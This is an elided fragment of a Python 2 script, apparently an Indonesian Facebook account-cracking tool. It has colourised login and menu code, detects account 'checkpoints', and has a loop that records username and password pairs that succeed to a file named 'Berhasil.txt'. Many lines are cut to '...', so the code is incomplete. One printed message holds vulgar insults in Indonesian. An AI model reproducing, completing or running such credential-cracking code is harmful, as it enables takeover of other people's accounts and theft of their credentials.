...
def login():
    ...
    try:
        ...
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
        ...
        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mAkunMu Checkpoint Cok'
...
def menu():
    ...
    try:
        ...
        try:
            ...
            os.system('clear')
            print '\x1b[1;91m[!] \x1b[1;93mKasihan akunMu kena Checkpoint Makanya Jangan Crack Mulu Cari Game Yg Bagus Kalau Mau Bagus Ya Top Up Sendiri Memek'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            ...
            if zedd == '2':
                ...
                if zedd == '3':
                    ...
                    if zedd == '4':
                        ...
                        if zedd == '5':
                            os.system('rm -rf login.txt')
                            os.system('xdg-open https://www.youtube.com/FrontalGaming')
                            keluar()
                        else:
                            if zedd == '0':
                                keluar()
        ...
        while file:
            ...
            if 'access_token' in mpsh:
                ...
                if 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('Berhasil.txt', 'w')
                    cek.write(username + ' | ' + passw + '\n')
                    cek.close()
                    berhasil.append('\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)
                    back += 1
                else:
